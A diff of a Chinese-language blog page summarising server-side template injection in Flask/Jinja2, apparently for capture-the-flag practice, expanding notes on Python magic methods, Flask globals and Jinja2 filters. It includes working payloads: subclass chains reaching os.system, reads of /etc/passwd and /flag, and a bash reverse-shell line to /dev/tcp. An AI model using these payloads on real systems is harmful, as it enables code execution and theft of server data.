@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">SSTI（服务器端模板注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%ADSSTI%E7%B1%BB%E5%9E%8B"><span class="toc-text">判断SSTI类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%B1%BB"><span class="toc-text">常用类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class"><span class="toc-text">__class__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bases"><span class="toc-text">__bases__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mro"><span class="toc-text">__mro__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subclasses"><span class="toc-text">__subclasses__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-text">__globals__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init"><span class="toc-text">__init__</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="toc-text">可利用的模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#os"><span class="toc-text">os</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins"><span class="toc-text">__builtins__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E6%9C%AC%E7%B1%BB"><span class="toc-text">获取基本类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#config"><span class="toc-text">config</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#request"><span class="toc-text">request</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0"><span class="toc-text">常用目标函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#os-popen"><span class="toc-text">os.popen()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subprocess-Popen"><span class="toc-text">subprocess.Popen()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E4%B8%AD%E9%97%B4%E5%AF%B9%E8%B1%A1"><span class="toc-text">常用中间对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">过滤器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinja2"><span class="toc-text">Jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%87%BD%E6%95%B0lipsum"><span class="toc-text">全局函数lipsum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set"><span class="toc-text">set</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">join过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#index"><span class="toc-text">index</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload%E6%94%B6%E9%9B%86"><span class="toc-text">Payload收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">SSTI（服务器端模板注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%ADSSTI%E7%B1%BB%E5%9E%8B"><span class="toc-text">判断SSTI类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95or%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-text">常用魔术方法or内置类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bases"><span class="toc-text">__bases__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mro"><span class="toc-text">__mro__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subclasses"><span class="toc-text">__subclasses__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init"><span class="toc-text">__init__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-text">__globals__</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="toc-text">可利用的模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#os"><span class="toc-text">os</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins"><span class="toc-text">__builtins__</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E6%9C%AC%E7%B1%BB"><span class="toc-text">获取基本类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#config"><span class="toc-text">config</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#request"><span class="toc-text">request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#url-for"><span class="toc-text">url_for</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-flashed-messages"><span class="toc-text">get_flashed_messages</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0"><span class="toc-text">常用目标函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#os-popen"><span class="toc-text">os.popen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subprocess-Popen"><span class="toc-text">subprocess.Popen()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E4%B8%AD%E9%97%B4%E5%AF%B9%E8%B1%A1"><span class="toc-text">常用中间对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinja2"><span class="toc-text">Jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%87%BD%E6%95%B0lipsum"><span class="toc-text">全局函数lipsum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set"><span class="toc-text">set</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">join过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#index"><span class="toc-text">index</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload%E6%94%B6%E9%9B%86"><span class="toc-text">Payload收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li></ol></li></ol>
     </div>
   
         
@@ -246,12 +246,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/python/" style="color: #00a596">python</a>
+                <a href="/blog/tags/python/" style="color: #03a9f4">python</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/SSTI/" style="color: #00a596">SSTI</a>
+                <a href="/blog/tags/SSTI/" style="color: #03a9f4">SSTI</a>
             </span>
             
             <span class="tag">
@@ -270,7 +270,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">2.1k字</span>
+        <span class="post-count">2.4k字</span>
       </span>
     </span>
 
@@ -279,7 +279,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">9分</span>
+        <span class="post-count">10分</span>
       </span>
     </span>
     
@@ -302,8 +302,9 @@
 <h2 id="判断SSTI类型"><a href="#判断SSTI类型" class="headerlink" title="判断SSTI类型"></a>判断SSTI类型</h2><p><img src="/blog/2023/04/17/SSTI%E6%80%BB%E7%BB%93/image-20221209231042495.png" alt="image-20221209231042495"></p>
 <span id="more"></span>
 
-<h2 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h2><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a>__class__</h3><blockquote>
-<p>返回调用的参数类型</p>
+<h2 id="常用魔术方法or内置类"><a href="#常用魔术方法or内置类" class="headerlink" title="常用魔术方法or内置类"></a>常用魔术方法or内置类</h2><p>比较全的整理：<a href="https://c1oudfl0w0.github.io/blog/2023/07/06/python%E7%89%B9%E6%80%A7">https://c1oudfl0w0.github.io/blog/2023/07/06/python%E7%89%B9%E6%80%A7</a></p>
+<blockquote>
+<p>返回调用的参数类型&#x2F;查看对象所在的类</p>
 </blockquote>
 <blockquote>
 <p>格式为<code>变量.__class__</code></p>
@@ -325,12 +326,10 @@
 
 <p>可以在最后加数组来查看指定的索引值</p>
 <h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a>__mro__</h3><blockquote>
-<p>显示类和基类</p>
+<p>查看继承关系和调用顺序，返回元组</p>
 </blockquote>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
 <span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
 
 <h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a>__subclasses__()</h3><blockquote>
 <p>返回object的子类</p>
@@ -342,14 +341,15 @@
 <span class="token operator">>></span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>可以在最后加数组来查看指定的索引值</p>
+<h3 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h3><blockquote>
+<p>初始化类，返回类型是function，可以用来跳到__globals__</p>
+</blockquote>
 <h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a>__globals__</h3><blockquote>
-<p>以字典类型返回当前位置的全部全局变量 与 func_globals 等价</p>
+<p>以字典类型返回当前位置的<strong>全部全局变量</strong>，与 func_globals 等价</p>
 </blockquote>
 <p>使用方式是<code>函数名.__globals__ </code>获取function所处空间下可使用的module、方法以及所有变量</p>
 <p>因为<code>__globals__</code>返回的是字典，所以要使用get来获取值</p>
-<h3 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h3><blockquote>
-<p>初始化类，返回类型是function</p>
-</blockquote>
+<hr>
 <h2 id="可利用的模块"><a href="#可利用的模块" class="headerlink" title="可利用的模块"></a>可利用的模块</h2><h3 id="os"><a href="#os" class="headerlink" title="os"></a>os</h3><p>找<code>&lt;class &#39;os._wrap_close&#39;&gt;</code></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
 <span class="token comment"># system无回显</span>
@@ -375,32 +375,39 @@
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">134</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <hr>
-<h3 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h3><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><blockquote>
-<p>获取当前设置，是一个用于存储应用程序配置变量的字典</p>
+<h2 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><blockquote>
+<p>获取当前application的设置，是一个用于存储应用程序配置变量的字典</p>
 </blockquote>
 <p>如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p>
-<h4 id="request"><a href="#request" class="headerlink" title="request"></a>request</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">request<span class="token punctuation">.</span>method <span class="token comment"># 请求方式</span>
+<h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">request<span class="token punctuation">.</span>method <span class="token comment"># 请求方式</span>
 request<span class="token punctuation">.</span>form <span class="token comment"># 存放FormData中的数据 to_dict 序列化成字典</span>
+request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>x1 <span class="token comment"># post传参</span>
 request<span class="token punctuation">.</span>args <span class="token comment"># 获取URL中的数据 to_dict 序列化成字典</span>
+request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>x1 <span class="token comment"># get传参</span>
 request<span class="token punctuation">.</span>url <span class="token comment"># 访问的完整路径</span>
 request<span class="token punctuation">.</span>path <span class="token comment"># 路由地址</span>
 request<span class="token punctuation">.</span>host <span class="token comment"># 主机地址</span>
 request<span class="token punctuation">.</span>values <span class="token comment"># 获取 FormData and URL中的数据 不要用to_dict</span>
 request<span class="token punctuation">.</span>json  <span class="token comment"># 如果提交时请求头中的Content-Type:application/json 字典操作</span>
-request<span class="token punctuation">.</span>data  <span class="token comment"># 如果提交时请求头中的Content-Type 无法被识别 将请求体中的原始数据存放 byte</span>
+request<span class="token punctuation">.</span>data  <span class="token comment"># post传参，如果提交时请求头中的Content-Type 无法被识别 将请求体中的原始数据存放 byte</span>
 request<span class="token punctuation">.</span>cookies <span class="token comment"># 获取Cookie中的数据</span>
 request<span class="token punctuation">.</span>headers <span class="token comment"># 获取请求头</span>
-request<span class="token punctuation">.</span>files <span class="token comment"># 序列化文件存储 save()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+request<span class="token punctuation">.</span>files <span class="token comment"># 序列化文件存储 save()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>url_for</p>
-<p>get_flashed_messages</p>
+<h3 id="url-for"><a href="#url-for" class="headerlink" title="url_for"></a>url_for</h3><blockquote>
+<p>flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[‘__builtins__‘]含有current_app</p>
+</blockquote>
+<h3 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages"></a>get_flashed_messages</h3><blockquote>
+<p>flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[‘__builtins__‘]含有current_app</p>
+</blockquote>
+<p>current_app：应用上下文，一个全局变量</p>
 <p>self</p>
 <p>redirect</p>
-<h3 id="常用目标函数"><a href="#常用目标函数" class="headerlink" title="常用目标函数"></a>常用目标函数</h3><h4 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen()"></a>os.popen()</h4><blockquote>
+<h2 id="常用目标函数"><a href="#常用目标函数" class="headerlink" title="常用目标函数"></a>常用目标函数</h2><h3 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen()"></a>os.popen()</h3><blockquote>
 <p>返回一个<code>&lt;class ‘os._wrap_close’&gt;</code>对象，需要读取后才能处理</p>
 </blockquote>
 <p>需重定向<code>read()</code>才能得到str</p>
-<h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/liuyingying0418/article/details/100939697">subprocess.Popen()</a></h4><blockquote>
+<h3 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/liuyingying0418/article/details/100939697">subprocess.Popen()</a></h3><blockquote>
 <p>在python中实现多进程程序，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/andy0816/p/15624304.html">以此执行shell</a></p>
 </blockquote>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">subprocess</span><span class="token punctuation">.</span>Popen<span class="token punctuation">(</span> 
@@ -443,14 +450,35 @@ request<span class="token punctuation">.</span>files <span class="token comment"
 <p>file</p>
 <p>exec</p>
 <p>eval</p>
-<h3 id="常用中间对象"><a href="#常用中间对象" class="headerlink" title="常用中间对象"></a>常用中间对象</h3><pre class="line-numbers language-django" data-language="django"><code class="language-django">catch_warnings.__init__.func_globals.linecache.os.popen('bash -i >&amp; /dev/tcp/127.0.0.1/233 0>&amp;1')
+<h2 id="常用中间对象"><a href="#常用中间对象" class="headerlink" title="常用中间对象"></a>常用中间对象</h2><pre class="line-numbers language-django" data-language="django"><code class="language-django">catch_warnings.__init__.func_globals.linecache.os.popen('bash -i >&amp; /dev/tcp/127.0.0.1/233 0>&amp;1')
 lipsum.__globals__.__builtins__.open("/flag").read()
 linecache.os.system('ls')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><blockquote>
+<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>官方文档：<a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#filters">https://jinja.palletsprojects.com/en/3.0.x/templates/#filters</a></p>
+<blockquote>
 <p>通过<code>|</code>进行使用的，它是一种特殊的占位符,告诉模板引擎这个位置的值从渲染模板时使用的数据中获取</p>
 </blockquote>
+<blockquote>
+<p>可以链接到多个过滤器，一个滤波器的输出将应用于下一个过滤器.</p>
+</blockquote>
 <p>过滤器相当于是一个函数，把当前的的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再渲染到模板页面中</p>
+<p>其实就是可以实现一些简单的功能，比如<code>attr()</code>过滤器可以实现代替<code>.</code>，<code>join()</code>可以将字符串进行拼接，<code>reverse</code>可以将字符串反置等等</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>获取一个序列或者字典的长度并将其返回
+<span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将值转换为<span class="token builtin">int</span>类型；
+<span class="token builtin">float</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将值转换为<span class="token builtin">float</span>类型；
+lower<span class="token punctuation">(</span><span class="token punctuation">)</span>：将字符串转换为小写；
+upper<span class="token punctuation">(</span><span class="token punctuation">)</span>：将字符串转换为大写；
+reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>：反转字符串；
+replace<span class="token punctuation">(</span>value<span class="token punctuation">,</span>old<span class="token punctuation">,</span>new<span class="token punctuation">)</span>： 将value中的old替换为new
+<span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将变量转换为列表类型；
+string<span class="token punctuation">(</span><span class="token punctuation">)</span>：将变量转换成字符串类型；
+join<span class="token punctuation">(</span><span class="token punctuation">)</span>：将一个序列中的参数值拼接成字符串<span class="token punctuation">,</span>通常有python内置的<span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>配合使用
+attr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 获取对象的属性
+关于attr<span class="token punctuation">:</span>
+官方解释：foo<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"bar"</span><span class="token punctuation">)</span> 等效于 foo<span class="token punctuation">[</span><span class="token string">"bar"</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <hr>
 <h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">官方文档</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">通杀脚本库fenjing</a></p>
